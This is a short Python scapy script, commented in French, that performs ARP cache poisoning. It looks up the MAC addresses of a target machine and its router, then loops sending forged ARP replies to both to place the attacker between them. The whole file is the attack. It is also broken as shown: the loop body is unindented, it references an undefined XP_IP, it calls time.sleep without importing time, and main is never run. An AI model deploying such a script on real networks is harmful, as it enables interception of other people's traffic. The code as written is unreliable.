from scapy.all import *
from time import sleep
import os
import sys


def MAC_address(IP):
        #cette fonction  permet de connaître l'adresse MAC associée à l'adresse IP
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP),timeout=2)

        for send,receive in ans:
              return receive[Ether].src  #cela renverra la source de l'adresse IP, c'est-à-dire l'adresse MAC

def main():
        router_IP =input('ex:10.10.111.1')
        IP = input('ex:10.10.111.101')
        print(IP,router_IP)#Adresse IP de la machine
        XP_MAC = MAC_address(IP)#Adresse MAC de la machine
        router_MAC = MAC_address(router_IP)#Adresse MAC du routeur externe

        while(True):
        #op=2 est pour envoyer les paquets de réponse  ARP 
        # les paquets de requête ARP gratuits sont envoyés à la machine XP
        send(ARP(op=2, psrc=router_IP, pdst=XP_IP, hwdst=XP_MAC))
        # les paquets de requête ARP gratuits sont envoyés au routeu
        send(ARP(op=2, psrc=XP_IP, pdst=router_IP, hwdst=router_MAC)) 
        
        time.sleep(4)
